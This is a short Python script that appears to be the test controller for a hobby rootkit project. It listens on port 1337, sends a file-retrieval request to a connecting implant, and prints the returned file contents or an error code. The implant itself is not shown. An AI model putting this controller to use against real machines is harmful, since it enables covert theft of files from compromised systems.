#!/usr/bin/python

import socket
import struct

PORT = 1337
FILE_PATH = b'/home/ppeck/Desktop/Stuff/Cyber/Projects/rootkit/test'
req = struct.pack('<H', 0) + struct.pack('<H', len(FILE_PATH)) + FILE_PATH

server_sock = socket.socket()
server_sock.bind(('', PORT))
server_sock.listen(1)
client_sock, client_address = server_sock.accept()

client_sock.send(req)

data_len = struct.unpack('<Q', client_sock.recv(8))[0]
print('Response data length: ' + str(data_len))

err = struct.unpack('<B', client_sock.recv(1))[0]
print('Response error code: ' + str(err))

file_path = FILE_PATH.decode()

if err == 0:
    print(file_path + ' was retrieved successfully!')
    data = client_sock.recv(data_len - 1)
    print('File Data:')
    print(data)
elif err == 1:
    print('Failed to open file ' + file_path + '.')
elif err == 2:
    print('Failed to get stats for file ' + file_path + '.')
elif err == 3:
    print('Failed to read from file ' + file_path + '.')

server_sock.close()
client_sock.close()
